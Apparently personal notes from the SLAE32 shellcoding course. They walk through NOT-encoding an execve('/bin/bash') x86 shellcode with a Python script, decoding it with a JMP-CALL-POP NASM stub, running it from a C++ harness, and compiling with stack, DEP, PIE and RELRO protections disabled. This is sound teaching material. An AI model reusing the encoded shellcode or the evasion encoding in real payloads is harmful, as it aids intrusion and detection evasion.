# NOT

## SHELL (PREP)
In order to understand how `execve` works, look at the arguments it takes, and how this translates to the registers:  

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
**execve does NOT need a return if successful**

```nasm
EAX = syscall
EBX = /bin/bash, 0x0
ECX = Address of /bin/bash, 0x00000000
EDX = 0x00000000
ESI -> /bin/bash
```

## Python (PREP)
Using the following Python3 script `NOT-encoder.py` to encode the shellcode
```python
#!/usr/bin/python3

# Python3 NOT Encoder
# SLAE32

shellcode = (
# Place shellcode here
b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print ("Encoded shellcode with NOT...\n")

for x in shellcode:
    # NOT Encoding (Complement)
    y = ~x
    encoded += "\\x"
    encoded += "%02x" % (y & 0xff)

    encoded2 += "0x"
    encoded2 += "%02x," % (y & 0xff)

print(encoded)
print()
print(encoded2)
print()

print("Length: %d" % len(shellcode))
```

## NASM  

Level 6 (`EXECVE-Stack` shellcode) before `NOT` Encoding:
```nasm
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Level 6 (`EXECVE-Stack` shellcode) after `NOT` (Complement) Encoding:
```nasm
"\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f"
```

### EXECVE  
```nasm
; EXECVE-NOT-decoder.nasm (JMP-CALL-POP)
; SLAE32
; NOT Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "NOT-encoder.py" to encode the shellcode

global _start

section .text
_start: 
    jmp short call_shellcode


decoder:
    pop esi
    xor ecx, ecx
    mov cl, 30              ; Length of shellcode is 30 decimal bytes


decode:
    not byte [esi]
    inc esi
    loop decode

    jmp short EncodedShellcode


call_shellcode:
    call decoder
    EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0x9d,0x9e,0x8c,0x97,0x97,0x9d,0x96,0x91,0xd0,0x97,0xd0,0xd0,0xd0,0xd0,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f

```


---


## Convert to Shellcode  

Use the [compile.sh](../compile.sh) script that will automatically compile, assemble, link, and then print the shellcode for CPP consumption.  


---


## CPP  
### Header file (.h)  
```cpp
/*
Following video: Module 2-9: NOT

    /mnt/git/NASM/SLAE32/2-9_NOT/execve-not:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       eb 0c                   jmp    804900e <call_shellcode>
    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       31 c9                   xor    ecx,ecx
     8049005:       b1 1e                   mov    cl,0x1e
    08049007 <decode>:
     8049007:       f6 16                   not    BYTE PTR [esi]
     8049009:       46                      inc    esi
     804900a:       e2 fb                   loop   8049007 <decode>
     804900c:       eb 05                   jmp    8049013 <EncodedShellcode>
    0804900e <call_shellcode>:
     804900e:       e8 ef ff ff ff          call   8049002 <decoder>
    08049013 <EncodedShellcode>:
     8049013:       ce                      into   
     8049014:       3f                      aas    
     8049015:       af                      scas   eax,DWORD PTR es:[edi]
     8049016:       97                      xchg   edi,eax
     8049017:       9d                      popf   
     8049018:       9e                      sahf   
     8049019:       8c 97 97 9d 96 91       mov    WORD PTR [edi-0x6e696269],ss
     804901f:       d0 97 d0 d0 d0 d0       rcl    BYTE PTR [edi-0x2f2f2f30],1
     8049025:       76 1c                   jbe    8049043 <EncodedShellcode+0x30>
     8049027:       af                      scas   eax,DWORD PTR es:[edi]
     8049028:       76 1d                   jbe    8049047 <EncodedShellcode+0x34>
     804902a:       ac                      lods   al,BYTE PTR ds:[esi]
     804902b:       76 1e                   jbe    804904b <EncodedShellcode+0x38>
     804902d:       4f                      dec    edi
     804902e:       f4                      hlt    
     804902f:       32                      .byte 0x32
     8049030:       7f                      .byte 0x7f
*/

unsigned char shellcode[] = {
"\xeb\x0c\x5e\x31\xc9\xb1\x1e\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef"
"\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0"
"\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32"
"\x7f"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
```

### CPP file (.cpp)  
```cpp
#include <stdio.h>
#include <string.h>
#include <stdint.h>		// Requirement for intptr_t/uintptr_t
// @ts-ignore
#include <sys/mman.h>	// Linux requirement for mmap / mprotect

// Clean place to keep all shellcode
#include "shellcode.h"

// Compile (x86) with:
// Note: Requires package gcc-multilib if on an x64 system
// gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
//
// DISABLE ALL PROTECTIONS:
// gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
//
// Compile (x64) with:
// gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>

int main()
{
	for (int i = 0; i < shellcode_len; i++){
		// printf("%02x ",*(shellcode + i));	// Output example: 31 c0 50 68
		printf("\\x%02x",*(shellcode + i));		// Output example: \x31\xc0\x50\x68
	}
	printf("\n");
	printf("Shellcode Length: %d\n", shellcode_len);

	// =====================================================
	// SLAE-32 method
	// Create a function pointer, that points to the raw shellcode, then call the shellcode pointer
	//
	int (*shellcode_func_ptr)() = (int(*)())shellcode;
	mprotect((void*)((uintptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_WRITE|PROT_EXEC);	// Required to add this to make the PAGE the shellcode is in, executable
	printf("Shellcode address: %p\n", shellcode_func_ptr);
	shellcode_func_ptr();
	// =====================================================


	// =====================================================
	// Memory Alloc method
	//
	// int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	// int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	
	// void *shellcode_mem_alloc = mmap(0, shellcode_len, prot, flags, -1, 0);

	// if(shellcode_mem_alloc == MAP_FAILED)
	// {
	// 	perror("mmap");
	// 	return 1;	// Error'd out
	// }
	// else{
	// 	memcpy(shellcode_mem_alloc, shellcode, shellcode_len);
	// 	((void(*)())shellcode_mem_alloc)();
	// }
	// =====================================================


	return 0;
}
```


---

## Compilation (GCC)

### Compile (`x86`):
_Note: Requires package `gcc-multilib` if on an `x64` system_
```shell
gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
```

### DISABLE ALL PROTECTIONS:
```shell
gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
```

### Compile (`x64`):
```shell
gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>
```